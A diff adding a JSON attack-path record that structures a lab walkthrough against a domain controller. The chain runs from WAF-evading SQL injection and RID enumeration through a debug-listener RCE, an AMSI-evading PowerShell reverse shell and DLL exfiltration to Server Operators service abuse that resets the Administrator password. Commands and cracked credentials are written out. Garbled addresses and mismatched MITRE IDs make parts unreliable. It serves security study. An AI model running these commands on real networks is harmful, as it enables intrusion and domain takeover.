@@ -1,0 +1,155 @@
+{
+  "id": "ap-0028",
+  "title": "Privilege Escalation: SQL Injection RID Enumeration -> Debug Listener RCE -> AD Abuse",
+  "summary": "Exploiting an ASP.NET SQL Injection vulnerability to enumerate Active Directory users via Relative Identifiers (RIDs), cracking hashes, gaining initial remote access via a VS Code debug listener RCE, and achieving Domain Admin by abusing GenericWrite privileges on a service operator group.",
+  "attack_path_markdown": "### Step 1: Initial Reconnaissance\nPerform network and web service enumeration using Nmap and CrackMapExec.\n### Step 2: SQL Injection\nDevelop a custom Python script to bypass the Web Application Firewall (WAF) by encoding the SQL query using Unicode escapes.\n### Step 3: AD User Enumeration via SQLi\nLeverage the SQL Injection vulnerability to extract domain user hashes and enumerate additional Active Directory users by iterating through Relative Identifiers (RIDs).\n### Step 4: Initial Foothold (RCE)\nGain initial access by exploiting a vulnerable Visual Studio Code debug listener running under a domain user account (j.york).\n### Step 5: Lateral Movement and Internal Recon\nUse obtained credentials for WinRM access and SharpHound for comprehensive internal domain mapping.\n### Step 6: Privilege Escalation to Domain Admin\nAbuse GenericWrite privileges on a user object to make it AS-REP Roastable, crack the resulting hash, and leverage Server Operator privileges to hijack a Windows service path to reset the Administrator password.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Initial system status checks, OS identification, port scanning, service enumeration, and identification of key attack vectors.",
+      "actions": [
+        "Check if the target is active: `ping 10 10 10 179`.",
+        "Scan all TCP ports: `sudo nmap -p- -sS --min-rate 5000 -v -n -Pn -oG ol ports 10 10 10 179`.",
+        "Scan services and versions: `nmap -sC -sV -oN target [OPEN_PORTS] 10 10 10 179`.",
+        "Detect web technologies: `whatweb http://10 10 10 179` [6] (Also used `whatweb -v`).",
+        "Enumerate SMB services (Identifies megacorp.local domain): `crackmapexec smb 10 10 10 179`.",
+        "Attempt null session SMB share listing: `smbclient -L \\10 10 10 179 -N` [8] and `smbmap -H 10 10 10 179 --null-session --no-banner`.",
+        "Set DNS resolution: Edit `/etc/hosts` to add `10 10 10 179 mega corp local`.",
+        "Enumerate users via Kerberos: `kerbrute userenum --dc 10 10 10 179 -d mega corp punto local users`.",
+        "Attempt AS-REP Roasting (No pre-auth found): `GetNPUsers.py mega corp punto local/[USER] -no-pass -dc-ip 10 10 10 179 -usersfile users`."
+      ],
+      "tools": ["nmap", "crackmapexec", "smbclient", "smbmap", "kerbrute", "GetNPUsers.py", "rpcclient", "whatweb"],
+      "techniques": ["OS Fingerprinting", "Port Scanning", "SMB Enumeration", "Web Enumeration", "Username Enumeration (Kerberos)"],
+      "mitre_ids": ["T1595.002", "T1046", "T1200", "T1558.003"],
+      "indicators": ["TTL 128", "Domain name: megacorp.local"],
+      "preconditions": "Network connectivity to the target 10.10.10.179",
+      "expected_outcome": "List of open services and confirmed valid AD user accounts (12/14)",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Creation of specialized tools and payloads required for WAF evasion and remote execution, based on identifying 403 Forbidden and 500 Internal Server Errors responses.",
+      "actions": [
+        "Develop a custom Python script (`sql_i.py`) based on SQLMap's `char_unicode_escape` tamper to convert SQL queries into Unicode escape format (`\\u00xx`) to bypass the WAF.",
+        "Prepare the PowerShell reverse shell payload (`ps.ps1`).",
+        "Modify the PowerShell script by replacing the function name `Invoke-PowerShellTcp` with a benign name (e.g., `queesesoque tienesahí`) to evade antivirus/AMSI detection."
+      ],
+      "tools": ["Python script", "Powershell", "wfuzz"],
+      "techniques": ["SQL Injection Payload Crafting", "Defense Evasion (AMSI Bypass, Encoding)"],
+      "mitre_ids": ["T1190", "T1059.001", "T1027", "T1497"],
+      "indicators": ["500 Internal Server Error response for certain characters (e.g., '/')", "Custom script code", "Modified PowerShell script"],
+      "preconditions": "Identification of WAF filtering rules requiring Unicode encoding for SQLi payloads.",
+      "expected_outcome": "Working Unicode SQL injection script and AV-evading RCE payload.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Transmission of the unique exploit payload and RCE tool to the target system.",
+      "actions": [
+        "Send the Unicode-encoded SQL injection query via POST request using the custom Python script to `/api/get_colleges`.",
+        "Upload the `zed_debug.exe` tool to the victim machine using WinRM upload functionality.",
+        "Host the PowerShell reverse shell payload (`ps.ps1`) via a local HTTP server: `python3 -m http.server 80`."
+      ],
+      "tools": ["Custom Python script (`sql_i.py`)", "evil-winrm", "Python HTTP server"],
+      "techniques": ["Exploit via Web Application", "Remote File Transfer (HTTP/SMB)"],
+      "mitre_ids": ["T1105", "T1021.006"],
+      "indicators": ["Successful file uploads/transfers"],
+      "preconditions": "RCE tools and payloads are ready and hosted.",
+      "expected_outcome": "Exploit material is present on the target or successfully delivered via API.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Successful execution of the SQL injection to obtain credentials and subsequent RCE via the debug listener.",
+      "actions": [
+        "Determine columns: Use `comillas order by [24-33]` (Found 5 columns).",
+        "Identify injectable columns (2 and 3) using `comillas union select 1, 2, 3, 4, 5`.",
+        "Extract DB, tables, columns, and user hashes (SHA384) using sequential SQLi queries.",
+        "Execute the custom Python script to iterate RIDs (e.g., 1100-1200) through SQL injection to discover additional valid AD users (e.g., `j.york`, `s.bauer`, `t.sikikatom`).",
+        "Crack the hashes: `hashcat.exe -m 17900 -a 0 hashes rockyou.txt --username` (Mode 17900 for SHA384) [42, 43]. Result: `t.sikikatom:finance1` [44].",
+        "Run `zed_debug.exe` (no args) to find exposed debug listener URL [45].",
+        "Exploit Debug Listener: `zed_debug.exe -u [URL] -c \"cmd.exe /c ping 10 10 14 29\"` (Confirmed RCE)."
+      ],
+      "tools": ["Custom Python script (`sql_i.py`)", "Hashcat", "zed_debug.exe"],
+      "techniques": ["SQL Injection", "AD User Enumeration via SQLi (RID)", "Hash Cracking", "RCE via Debug Listener Abuse"],
+      "mitre_ids": ["T1068", "T1558", "T1558.003", "T1059.005"],
+      "indicators": ["Valid credentials (e.g., t.sikikatom:finance1)", "Success in remote ping execution"],
+      "preconditions": "Custom Unicode-encoding mechanism ready.",
+      "expected_outcome": "Initial remote code execution running as low-privileged domain user (j.york).",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establish a consistent reverse shell connection for stable interaction by evading antivirus (AV).",
+      "actions": [
+        "Encode PowerShell payload: `echo [PS_COMMAND] | iconv -t UTF-16LE | base64 -w 0`.",
+        "Start listener: `nc -lvnp 443`.",
+        "Execute encoded payload via Debug Listener: `powershell.exe -e [BASE64_PAYLOAD]` (Command injected via `zed_debug.exe -c`).",
+        "Confirmation of AV/AMSI bypass: Script executed successfully despite previous detection of malicious content."
+      ],
+      "tools": ["netcat", "PowerShell", "iconv", "base64"],
+      "techniques": ["Reverse Shell", "Encoded Command Execution", "AMSI/AV Bypass"],
+      "mitre_ids": ["T1059.001", "T1027", "T1204.002"],
+      "indicators": ["Successful shell connection on port 443 running as j.york"],
+      "preconditions": "Successful RCE in Phase 4 and encoded payload to bypass AV.",
+      "expected_outcome": "Stable interactive shell access to the victim machine.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Maintaining access, credential harvesting, and internal domain reconnaissance to identify privilege escalation paths.",
+      "actions": [
+        "Pivot via WinRM (using t.sikikatom): `evil-winrm -i 10 10 10 179 -u t.sikikatom -p finance1`.",
+        "Perform extensive AD enumeration: `ldapdomaindump -u t.sikikatom -p finance1 10 10 10 179 -d mega corp punto local`.",
+        "Internal recon (via j.york shell): Identified DLL in web directory (`inetpub/wwwroot/bin/MultiMaster.API.dll`).",
+        "Transfer DLL: `smbserver.py smb_folder .` and `copy \"MultiMaster.API.dll\" \\10 10 14 29\smb_folder\`.",
+        "Extract hardcoded credentials from DLL: `strings -el MultiMaster.API.dll` (Found password: `WIDETECTEDTHERADAR`).",
+        "Password spray with new credential: `crackmapexec smb 10 10 10 179 -u users -p WIDETECTEDTHERADAR --continue-on-success` (Found valid user s.bauer) [57, 58].",
+        "Pivot via WinRM (using s.bauer): `evil-winrm -i 10 10 10 179 -u s.bauer -p WIDETECTEDTHERADAR`.",
+        "Advanced AD mapping: Upload and run `SharpHound.exe --collectionmethod all`. (Reveals s.bauer has GenericWrite on j.york, who is in Server Operators group)."
+      ],
+      "tools": ["evil-winrm", "ldapdomaindump", "smbserver.py", "strings", "crackmapexec", "SharpHound.exe"],
+      "techniques": ["Lateral Movement (WinRM)", "Domain Enumeration", "Credential Harvesting (DLL Analysis)", "Password Spraying", "Advanced Discovery (SharpHound)"],
+      "mitre_ids": ["T1021.006", "T1559.002", "T1087.002", "T1003.007", "T1049"],
+      "indicators": ["Credentials embedded in DLL", "Discovery of Server Operators group membership"],
+      "preconditions": "Access as t.sikikatom and successful execution of SharpHound.",
+      "expected_outcome": "Detailed domain map and identification of the PE path (s.bauer -> j.york -> Server Operators -> Domain Admins).",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Execution of the final privilege escalation sequence to gain Domain Administrator access.",
+      "actions": [
+        "Abuse `GenericWrite` privilege (as s.bauer) to enable AS-REP roasting on j.york: `Set-ADAccountControl -Identity j.york -DontRequirePreAuth $True`.",
+        "Obtain and crack AS-REP hash (implied): Resulting password `Rainforest786` found.",
+        "Pivot (as j.york): `evil-winrm -i 10 10 10 179 -u j.york -p Rainforest786`.",
+        "Service Path Hijacking (Server Operator Abuse): Modify the 'Browser' service binary path: `sc config Browser binpath= \"cmd.exe /c net user Administrator [NEW_PASSWORD]\"`.",
+        "Execute privileged command: `sc stop Browser` and `sc start Browser`.",
+        "Gain final Domain Administrator access: `evil-winrm -i 10 10 10 179 -u Administrator -p [NEW_PASSWORD]`."
+      ],
+      "tools": ["PowerShell (Set-ADAccountControl)", "Hash cracking tools", "sc.exe", "evil-winrm"],
+      "techniques": ["Kerberos Pre-Authentication Attack (AS-REP Roast)", "Server Operator Abuse (Service Path Modification)", "Password Change"],
+      "mitre_ids": ["T1558.004", "T1543.003", "T1078.002"],
+      "indicators": ["Administrator password successfully reset", "Successful WinRM connection as Administrator"],
+      "preconditions": "Credentials for j.york and Server Operators group membership.",
+      "expected_outcome": "Full Domain Administrator privileges (Goal achieved).",
+      "confidence": 1.0
+    }
+  ],
+  "tactics": ["Reconnaissance", "Credential Access", "Discovery", "Lateral Movement", "Privilege Escalation", "Execution"],
+  "techniques": ["SQL Injection", "AS-REP Roasting", "Service Path Modification", "RCE via Debug Listener", "Domain Enumeration", "Lateral Movement (WinRM)"],
+  "mitre_ids": ["T1046", "T1558.003", "T1558.004", "T1059.005", "T1021.006", "T1543.003", "T1087.002", "T1105", "T1027", "T1497"],
+  "hosts": ["10.10.10.179", "megacorp.local"],
+  "privs_obtained": ["domain user (t.sikikatom)", "domain user (s.bauer)", "domain user (j.york)", "Administrator (Domain Admin)"],
+  "confidence": 1.0,
+  "source_file": "",
+  "notes": "The procedure required extensive custom scripting to handle WAF bypass and specialized SQL queries for Active Directory RID enumeration. The use of SharpHound was crucial for identifying the GenericWrite -> Server Operator path.",
+  "labels": ["attack_path", "active_directory", "sql_injection", "winrm", "privilege_escalation"]
+}
